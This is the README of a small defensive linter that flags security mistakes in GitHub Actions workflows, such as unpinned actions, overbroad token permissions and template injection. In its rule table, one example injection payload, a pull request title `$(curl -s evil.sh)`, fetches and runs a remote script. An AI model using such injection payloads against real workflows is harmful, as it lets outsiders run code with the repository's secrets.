# workflow-guard

A small command-line checker for **security mistakes in GitHub Actions workflows**: actions that
aren't pinned, a `GITHUB_TOKEN` with more rights than it needs, pull request titles pasted into
shell scripts, and a few more. It prints `file:line:column` findings and exits non-zero, so it can
run in CI or as a pre-commit check.

## Why

Workflows are code that runs with secrets and a token that can write to the repository, but they
rarely get reviewed like code. The mistakes are well documented (GitHub's own
[security hardening guide](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions),
the [WordPress workflow standards](https://developer.wordpress.org/coding-standards/wordpress-coding-standards/github-actions/))
and easy to check by machine.

This is a learning project. Mature tools already exist and go much further:
[actionlint](https://github.com/rhysd/actionlint) type-checks whole workflows and
[zizmor](https://github.com/zizmorcore/zizmor) is a full security auditor. workflow-guard is
deliberately small and readable: one file per concern, every rule explained below.

## Rules

| Id | Name | Severity | What it finds |
|----|------|----------|---------------|
| WG001 | unpinned-action | low for `actions/*`, `github/*`; high for other owners; medium for Docker tags | `uses:` with a tag or branch (`@v4`, `@main`), a short SHA, or no version. A tag can be moved to malicious code after you've reviewed it; a full 40-character commit SHA can't. Covers steps and reusable workflows (`jobs.<id>.uses`). |
| WG002 | missing-permissions | medium | No `permissions:` at the top and at least one job without its own. The token then gets the repository's default, which may be read/write for everything. |
| WG003 | write-all | high | `permissions: write-all` at workflow or job level. |
| WG004 | template-injection | high | `${{ github.event.pull_request.title }}` and other outsider-controlled values (issue/PR/comment text, branch names, commit messages) inside `run:` or `actions/github-script`. The value is pasted into the script before it runs, so a PR titled `$(curl -s evil.sh)` downloads and runs that script. Pass it through `env:` and use `"$TITLE"` instead. |
| WG005 | pull-request-target | low, or high with a PR checkout | `pull_request_target` runs with secrets even for pull requests from forks. Checking out the PR's head (`ref: ${{ github.event.pull_request.head.sha }}`) then runs a stranger's code with those secrets. |
| WG006 | persisted-credentials | low | `actions/checkout` without `persist-credentials: false` leaves the token in `.git/config`, readable by every later step. |

## Install

Needs Python 3.10+.

```bash
git clone https://github.com/Gallileee/workflow-guard.git
cd workflow-guard
python -m venv .venv
.venv/bin/pip install -e ".[dev]"      # Windows: .venv\Scripts\pip install -e ".[dev]"
```

## Usage

```bash
workflow-guard                          # checks .github/workflows in the current directory
workflow-guard path/to/ci.yml other/dir # files or directories
workflow-guard --format json            # machine-readable output
workflow-guard --format sarif --output results.sarif  # for GitHub code scanning
workflow-guard --min-severity medium    # hide low findings
workflow-guard --fail-on high           # show everything, but only fail on high
workflow-guard --ignore WG006           # skip rules
workflow-guard --list-rules
workflow-guard --fix                    # pin actions to commit SHAs (rewrites the files)
```

Example (from a real repository):

```
.github/workflows/server.yml:8:1: WG002 [medium] no 'permissions:' at the top or in job(s) test; ...
.github/workflows/server.yml:12:15: WG001 [low] 'actions/checkout@v7' points to a tag or branch that can be moved; ...
```

To accept a finding on one line, add a comment there:

```yaml
- uses: actions/checkout@v4  # workflow-guard: ignore[WG001, WG006]
```

### Pinning actions automatically

`--fix` looks up the commit each tag or branch points to right now and rewrites the line:

```diff
-      - uses: actions/checkout@v7
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7
```

- Only the `uses:` value and the end of its line change. Comments, quotes, indentation and
  Windows line endings stay as they were; an existing comment becomes `# v7; old comment`.
- The version stays in the comment, so Dependabot and Renovate can keep updating pinned actions.
- It uses `GET /repos/{owner}/{repo}/commits/{ref}` with the `application/vnd.github.sha` media
  type, which answers with just the SHA. Lookups are cached per run.
- GitHub allows 60 anonymous API requests an hour. Set `GITHUB_TOKEN` or `GH_TOKEN` for more, e.g.
  `GH_TOKEN=$(gh auth token) workflow-guard --fix`. The token is only sent to api.github.com.
- Lines with `# workflow-guard: ignore[WG001]`, local actions, actions without a version and
  Docker images are left alone. A tag that can't be found is reported and its line kept.
- Review the diff before committing: `--fix` trusts what the tag points to today, so it pins
  whatever is there now. Check that the action is one you meant to use.

### Code scanning (SARIF)

`--format sarif` writes [SARIF 2.1.0](https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html),
which GitHub code scanning reads. The findings then appear in the repository's Security tab and as
annotations on the lines a pull request changes. Use `--output FILE` rather than `>`: PowerShell's
redirection writes UTF-16, which the upload rejects.

```yaml
jobs:
  workflow-guard:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write   # needed to upload results
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0  # v7.1.0
        with:
          python-version: "3.14"
      # Pin a commit of workflow-guard too, for the same reason as the actions.
      - run: pip install "git+https://github.com/Gallileee/workflow-guard@<commit SHA>"
      - run: workflow-guard --format sarif --output results.sarif --fail-on high
      - uses: github/codeql-action/upload-sarif@33d7b85da1a04171e211befe2c739303b9a4c066  # v4.39.3
        if: always()
        with:
          sarif_file: results.sarif
          category: workflow-guard
```

How the report maps to code scanning:

- Severity becomes the SARIF `level`: high = `error`, medium = `warning`, low = `note`. It's set per
  result because WG001 and WG005 vary per finding; that's also why the rules carry no
  `security-severity` score (GitHub reads that per rule, not per result).
- Every rule has a description and help text, shown on the alert page.
- Each result has its own `partialFingerprints` value, a hash of rule, file and message without
  the line number. An alert therefore stays the same alert when lines above it move, and is closed
  when the problem is fixed. Two identical problems in one file are told apart by their order.
- Paths are relative to where you run the tool (`%SRCROOT%`), so run it from the repository root.
- Files that can't be parsed are listed as tool notifications, and the run is marked
  unsuccessful, instead of just missing from the report.

This repository's own CI uploads its results the same way (the `code-scanning` job).

Exit codes: `0` nothing at or above `--fail-on` (default `low`), `1` findings, `2` a file couldn't
be read or parsed, or bad arguments.

## How it works

- Workflows are read with PyYAML's `compose`, which gives **nodes** with line and column numbers
  instead of plain dicts. That's what makes `file:line:column` possible, and it also avoids a
  classic YAML 1.1 trap: `yaml.safe_load` turns the key `on` into the boolean `True`.
- Each rule is a function `Workflow -> Iterator[Finding]` in `rules.py`, registered in `RULES`.
- `${{ }}` expressions are found with a regex and checked against a list of untrusted contexts.
  For `run: |` blocks the line of the expression itself is reported, not the `run:` line.

```
src/workflow_guard/
  workflow.py  loading, node helpers, jobs/steps/triggers, inline ignores
  rules.py     the six rules
  fix.py       --fix: GitHubResolver (API lookups) and pin_actions (text edits)
  sarif.py     --format sarif: rules, results, fingerprints, notifications
  model.py     Finding, Severity
  cli.py       arguments, file discovery, text/JSON/SARIF output, exit codes
tests/         pytest: rules, CLI, SARIF, and --fix (with a local HTTP server standing in for GitHub)
```

## Tests

```bash
pytest -q
ruff check . && ruff format --check .
```

CI runs them on Python 3.10, 3.12 and 3.14, and then runs workflow-guard on this repository's own
workflow, which pins its actions to commit SHAs.

## Limitations

- Expressions are matched with regular expressions, not parsed, so unusual spellings
  (`github.event['pull_request']['title']`) aren't caught.
- Composite actions (`action.yml`) and the inside of called reusable workflows aren't checked.
- WG004 only looks at `run:` and `actions/github-script`; other actions can also misuse inputs.
- WG001 doesn't check that a SHA really belongs to the repository's tag (a SHA from a fork works
  on GitHub too).
- `--fix` only fixes WG001. The other rules need a human decision (which permissions a job needs).
- The SARIF output isn't checked against the JSON schema in CI (it was checked by hand, see
  PROGRESS.md); the tests check the fields GitHub requires.
- `--fix` doesn't look into GitHub Enterprise Server (the API URL is fixed to api.github.com).

## Next steps

See [PROGRESS.md](PROGRESS.md).

## License

MIT
